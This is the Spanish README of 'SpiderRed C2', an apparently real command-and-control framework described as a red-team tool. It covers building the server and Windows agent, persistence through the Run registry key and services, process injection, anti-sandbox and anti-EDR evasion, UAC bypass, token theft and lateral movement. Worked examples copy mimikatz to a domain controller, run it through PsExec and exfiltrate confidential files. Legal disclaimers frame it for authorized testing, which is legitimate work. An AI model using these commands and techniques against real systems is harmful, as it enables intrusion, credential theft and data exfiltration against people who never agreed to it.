# 🕷️ SpiderRed C2 - Command & Control Framework

> **IMPORTANTE LEGAL**: SpiderRed es una herramienta para **pruebas de penetración autorizadas**, **investigación de seguridad**, y **ejercicios de red team**. Su uso fuera de entornos autorizados es **ilegal** y puede resultar en acciones penales.

## 📋 Descripción Técnica

SpiderRed es un framework C2 ligero escrito en C++ diseñado para:
- **Pruebas de penetración autorizadas** (red team)
- **Simulación de adversarios** (adversary simulation)
- **Investigación de malware** (en entornos controlados)
- **Entrenamiento de blue team** (detection engineering)

### Características Clave

✅ **Ligero y rápido** (C++ nativo, sin dependencias pesadas)  
✅ **Baja detección** (técnicas anti-EDR básicas)  
✅ **Comunicación encriptada** (AES-256 + RSA para handshake)  
✅ **Multi-plataforma** (Windows/Linux)  
✅ **Modular** (fácil extensión)  

## 🚀 Requisitos del Sistema

### Servidor C2 (Linux)
```bash
# Distribuciones compatibles
- Kali Linux 2023.x+
- Ubuntu 22.04+
- Debian 11+

# Dependencias
sudo apt-get update
sudo apt-get install -y \
    build-essential \
    cmake \
    libssl-dev \
    gcc-11 \
    g++-11
```

### Agente (Windows)
- Windows 10/11 64-bit
- Visual Studio 2019/2022 (para compilación)
- Windows SDK 10.0.19041.0+

## 📦 Instalación Rápida

### 1. Clonar el Repositorio
```bash
git clone https://github.com/JdExploit/SpiderRed-C2.git
cd SpiderRed-C2
```

### 2. Compilar el Servidor (Linux)
```bash
# Dar permisos de ejecución
chmod +x compile_server.sh

# Compilar
./compile_server.sh

# Verificar compilación
ls -la c2_server
```

### 3. Compilar el Agente (Windows)
**Usando Visual Studio Developer Command Prompt:**
```cmd
# Navegar al directorio
cd C:\path\to\SpiderRed-C2

# Compilar Release x64
cl /EHsc /std:c++17 /O2 /MT /DNDEBUG ^
    /I"C:\Program Files\OpenSSL-Win64\include" ^
    agent.cpp ^
    /link /LIBPATH:"C:\Program Files\OpenSSL-Win64\lib" libssl.lib libcrypto.lib ^
    ws2_32.lib advapi32.lib user32.lib ^
    /OUT:agent.exe /SUBSYSTEM:CONSOLE
```

**O usar el batch incluido (requiere VS instalado):**
```cmd
compile_agent.bat
```

## 🖥️ Configuración del Servidor

### 1. Configurar IP y Puerto
Editar `server.cpp` (línea ~50):
```cpp
#define SERVER_IP "0.0.0.0"    // Escuchar en todas las interfaces
#define SERVER_PORT 443         // Usar puerto común para evadir filtros básicos
```

### 2. Compilar con encriptación
```bash
# Habilitar OpenSSL para encriptación
sudo apt-get install libssl-dev
g++ -std=c++17 -pthread -o c2_server server.cpp -lcrypto
```

### 3. Ejecutar el Servidor
```bash
# Ejecutar normalmente
./c2_server

# Ejecutar en segundo plano
nohup ./c2_server > c2.log 2>&1 &

# Ver logs
tail -f c2.log
```

## 🎯 Despliegue del Agente

### Métodos de Ejecución

**1. Ejecución Directa:**
```cmd
agent.exe
```

**2. Ejecución con Persistencia (Registry Run):**
```cmd
agent.exe --install
# Se instala en: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**3. Ejecución como Servicio:**
```cmd
# Requiere permisos de administrador
agent.exe --service-install
sc start SpiderRedAgent
```

**4. Ejecución con Inyección de Proceso:**
```powershell
# Inyectar en un proceso legítimo
.\agent.exe --inject notepad.exe
```

### Técnicas de Evasión Básicas

El agente incluye:
- **Anti-sandbox**: Detecta máquinas virtuales comunes
- **Anti-debug**: Chequea debuggers adjuntos
- **Uso mínimo de API**: Minimiza hooks de EDR
- **Sleep obfuscation**: Ofuscación de tiempos de espera

## 📡 Comandos del C2

### Interfaz Principal
```
SpiderRed> help

[+] Comandos Disponibles:

AGENTES
  agents                    - Listar agentes conectados
  info <id>                 - Información detallada del agente
  interact <id>             - Modo interactivo con agente
  rename <id> <nombre>      - Renombrar agente
  kill <id>                 - Terminar sesión del agente

EJECUCIÓN
  exec <id> <comando>       - Ejecutar comando
  shell <id>                - Shell interactiva
  powershell <id> <cmd>     - Ejecutar PowerShell
  python <id> <script>      - Ejecutar script Python

ARCHIVOS
  upload <id> <loc> <rem>   - Subir archivo
  download <id> <remoto>    - Descargar archivo
  ls <id> <ruta>            - Listar directorio
  cat <id> <archivo>        - Ver contenido
  find <id> <patrón>        - Buscar archivos

RECONOCIMIENTO
  sysinfo <id>              - Información del sistema
  netstat <id>              - Conexiones de red
  processes <id>            - Listar procesos
  screenshot <id>           - Capturar pantalla

PRIVILEGIOS
  getprivs <id>             - Obtener privilegios actuales
  bypassuac <id>            - Intentar bypass de UAC
  steal_token <id> <pid>    - Robar token de proceso

PERSISTENCIA
  persist <id>              - Establecer persistencia
  schedule <id> <tarea>     - Crear tarea programada
  registry <id> <ruta>      - Agregar entrada de registro

LATERAL MOVEMENT
  psexec <id> <host> <cmd>  - Ejecutar comando remoto via PsExec
  wmi <id> <host> <cmd>     - Ejecutar via WMI
  smb <id> <share>          - Enumerar recursos SMB

SALIR
  exit                      - Salir del servidor C2
  quit                      - Salir del servidor C2
```

## 🔧 Ejemplos de Uso en Pentesting

### 1. Fase Inicial - Reconocimiento
```bash
SpiderRed> agents
[0] WIN10-CLIENT (192.168.1.105) - Domain\User - Windows 10 Pro

SpiderRed> interact 0
SpiderRed[WIN10-CLIENT]> sysinfo
SpiderRed[WIN10-CLIENT]> netstat
SpiderRed[WIN10-CLIENT]> whoami /priv
```

### 2. Enumeración de Red
```bash
SpiderRed[WIN10-CLIENT]> exec arp -a
SpiderRed[WIN10-CLIENT]> exec net view /domain
SpiderRed[WIN10-CLIENT]> exec net group "Domain Admins" /domain
```

### 3. Movimiento Lateral
```bash
SpiderRed[WIN10-CLIENT]> exec net use \\DC01\C$ /user:domain\user
SpiderRed[WIN10-CLIENT]> upload 0 mimikatz.exe \\DC01\C$\Windows\Temp\
SpiderRed[WIN10-CLIENT]> psexec 0 DC01 "C:\Windows\Temp\mimikatz.exe"
```

### 4. Exfiltración de Datos
```bash
SpiderRed[WIN10-CLIENT]> find 0 *.pdf
SpiderRed[WIN10-CLIENT]> download 0 C:\Users\Admin\Documents\confidential.pdf
```

## 🛡️ Hardening y Seguridad

### 1. Autenticación del Servidor
```cpp
// En server.cpp - Configurar credenciales
#define C2_USERNAME "redteam"
#define C2_PASSWORD "SecurePass123!"
#define C2_ENCRYPTION_KEY "32-Byte-AES-Key-For-Encryption!!"
```

### 2. Usar Certificados SSL
```bash
# Generar certificado autofirmado
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Compilar con soporte SSL
g++ -std=c++17 -pthread -o c2_server server.cpp -lcrypto -lssl
```

### 3. Configurar Firewall
```bash
# Permitir solo IPs específicas
sudo iptables -A INPUT -p tcp --dport 443 -s 192.168.1.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j DROP
```


> ⚠️ **ADVERTENCIA LEGAL**: Este software es únicamente para fines educativos y de investigación autorizada. El uso no autorizado es ilegal y puede resultar en severas consecuencias penales.
